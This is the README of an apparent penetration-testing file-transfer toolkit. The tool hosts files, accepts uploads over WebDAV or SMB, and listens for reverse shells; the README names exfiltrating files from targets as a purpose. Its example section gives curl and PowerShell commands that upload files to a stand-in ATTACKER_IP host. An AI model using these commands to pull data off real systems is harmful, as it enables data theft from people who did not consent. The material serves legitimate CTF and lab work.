# S3Rv3RS

**S3Rv3RS** is a lightweight file-transfer toolkit designed for **penetration testing, CTFs, and lab environments**.
It provides quick ways to **host files, receive uploads, share files via SMB, or listen for shells** using a single script.

The goal is to simplify common tasks during engagements such as:

* Hosting tools for a compromised machine
* Exfiltrating files from a target
* Transferring binaries in Windows environments
* Setting up quick listeners

The script automatically installs required dependencies and supports multiple transfer methods.

---

# Features

* **Nginx WebDAV Server**
  Upload and download files using HTTP/HTTPS.

* **Python HTTP Server**
  Quickly host files for download.

* **SMB File Share (Impacket)**
  Useful for Windows targets.

* **Netcat Listener**
  Simple reverse shell listener.

* **HTTPS Support**
  Generate a temporary self-signed certificate for encrypted transfers.

* **Automatic Dependency Installation**

* **Auto IP Detection**
  Prefers `tun0` (VPN) then `eth0`.

---

# Requirements

The script will automatically install these packages if they are missing:

* nginx
* python3
* python3-pip
* openssl
* netcat-openbsd
* curl
* impacket (Python library)

---

# Installation

Clone the repository:

```bash
git clone https://github.com/yourusername/S3Rv3RS.git
cd S3Rv3RS
chmod +x S3Rv3RS
sudo mv S3Rv3RS /usr/local/bin/
```

---

# Usage

```bash
S3Rv3RS [MODE] [OPTIONS]
```

## Modes

| Mode               | Description                                   |
| ------------------ | --------------------------------------------- |
| `-n`, `--nginx`    | Start Nginx WebDAV server (upload + download) |
| `-s`, `--smb`      | Start SMB share using Impacket                |
| `-d`, `--download` | Start Python HTTP server                      |
| `-c`, `--netcat`   | Start Netcat listener                         |

---

## Options

| Option         | Description                 |
| -------------- | --------------------------- |
| `--ssl`        | Enable HTTPS for Nginx mode |
| `-p`, `--port` | Specify custom port         |
| `-h`, `--help` | Show help menu              |

---

# Examples

### Start HTTP WebDAV server

```bash
S3Rv3RS -n
```

### Start HTTPS WebDAV server

```bash
S3Rv3RS -n --ssl
```

### Start SMB share

```bash
S3Rv3RS -s
```

### Start Python file server

```bash
S3Rv3RS -d
```

### Start Netcat listener

```bash
S3Rv3RS -c
```

---

# Example File Transfers

## Upload file using curl (Linux)

```bash
curl -T file.txt http://ATTACKER_IP:9001/upload/file.txt
```

## Upload file using PowerShell

```powershell
(New-Object System.Net.WebClient).UploadFile('http://ATTACKER_IP:9001/upload/file.txt','PUT','file.txt')
```

## Download file from SMB share (Windows)

```cmd
copy \\ATTACKER_IP\share\file.exe C:\temp\file.exe
```

---

# Notes

* The Nginx server uses a temporary configuration and logs stored in `/tmp`.
* Files uploaded via WebDAV are saved in the current working directory.
* HTTPS mode generates a temporary self-signed certificate.
